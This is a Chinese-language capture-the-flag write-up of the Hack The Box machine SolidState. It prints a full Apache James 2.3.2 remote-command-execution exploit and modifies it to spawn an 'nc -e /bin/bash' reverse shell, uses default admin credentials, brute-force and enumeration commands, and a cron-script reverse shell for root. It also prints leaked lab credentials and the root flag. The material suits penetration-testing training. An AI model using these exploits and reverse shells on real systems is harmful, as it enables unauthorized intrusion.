kali 10.10.16.5

靶机 10.10.10.51



```bash
└─# nmap  -sV -sC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello 10.10.10.51 (10.10.16.5 [10.10.16.5])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.93%I=7%D=9/8%Time=64FBC028%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,56,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPle
SF:ase\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.13 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.12 (93%), Linux 3.8 - 3.11 (93%), DD-WRT (Linux 3.18) (93%), DD-WRT v3.0 (Linux 4.4.2) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



25：

用户名枚举

```bash
smtp-user-enum -M VRFY -U cewl.list -t 10.10.10.51
```





110：

```bash
└─# telnet $ip 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER JAMES
+OK
```

[【渗透技巧】pop3协议渗透_pop3渗透_包大人在此的博客-CSDN博客](https://blog.csdn.net/b10d9/article/details/112155909)

[110-pop3 (flowus.cn)](https://flowus.cn/5fd1d77b-b5ed-4753-a765-90bdbf6bffb7)

[110,995 - Pentesting POP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)

生成社工字典

```bash
└─# cewl http://10.10.10.51/ -w cewl.list
```

可以尝试爆破

```bash
└─# hydra -s 110 -L cewl.list -P /usr/share/wordlists/rockyou.txt -e nsr -t 22 10.10.10.51 pop3
```



4555：

```bash
└─# nc 10.10.10.51 4555                                                                                                                                   
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
JAMES
Password:
JAMES
Login failed for JAMES
Login id:
```



以上做了很多尝试，接下来跟文章做[Hack The Box - Solidstate : Jai Minton](https://www.jaiminton.com/HTB/Solidstate/#)

还是拿到一些系统，要先搜索相关漏洞啊



关于 4555 端口的信息

```bash
└─# searchsploit JAMES 2.3.2                     
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                            | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                            | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                  | linux/remote/50347.py
```

```bash
└─# cat 35513.py 
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."       
```

观察到 exp 里的账号和密码都是 root

于是 root:root 来登录 4555 端口的 `Apache James Server 2.3.2`

```bash
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

得到5个账号

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

修改 mindy 的密码 为 mindy

再次登录 110 端口

```bash
└─# telnet $ip 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
user mindy
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
pass mindy
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

得到一对账号密码

```
mindy:P@55W0rd1!2@
```



ssh登录后显示时 rbash，是一个受限制的 shell

```bash
└─# ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```



回头利用 exp  35513.py ，修改 paylaod 为 反弹 shell

```python
# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = 'nc -e /bin/bash 10.10.16.5 1234' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'
```



运行 exp

```bash
└─# python2 35513.py 10.10.10.51                                                                                                                              1 ⨯
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

再次 ssh mindy 用户登录，同时 kali 监听 1234 端口

```bash
└─# ssh mindy@10.10.10.51                                                                                                                                   127 ⨯
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep  8 22:16:22 2023 from 10.10.16.5
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <13863972.0.1694225749606.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.16.5 ([10.10.16.5])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 495
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Fri, 8 Sep 2023 22:15:09 -0400 (EDT)
Date: Fri, 8 Sep 2023 22:15:09 -0400 (EDT)
From: team@team.pl

: No such file or directory
```

```bash
─# nc -lvnp 1234                                                                                                                                             1 ⨯
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.51] 46274
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

这个意思可能就是在 ssh 登录 mindy 用户时，就会触发 exp 里的反弹 shell 代码



提权：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
find / -user root -writable -type f -not -path "/proc/*"  2>/dev/null
```



计划任务，上 https://github.com/DominicBreuker/pspy 得到 `/opt/tmp.py` 在运行



```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ find / -user root -writable -type f -not -path "/proc/*"  2>/dev/null
e -type f -not -path "/proc/*"  2>/dev/null
/opt/tmp.py
/sys/fs/cgroup/memory/cgroup.event_control
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -al /opt/tmp.py
ls -al /opt/tmp.py
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```



buff叠满了

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```



写入 反弹 shell

```bash
echo "os.system('/bin/nc -e /bin/bash 10.10.16.5 4321')" >> /opt/tmp.py
```

 

kali 监听

```bash
└─# nc -lvnp 4321      
listening on [any] 4321 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.51] 57006
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
3f4d42d56f5c0a1442449dc7d0d9caf2
```


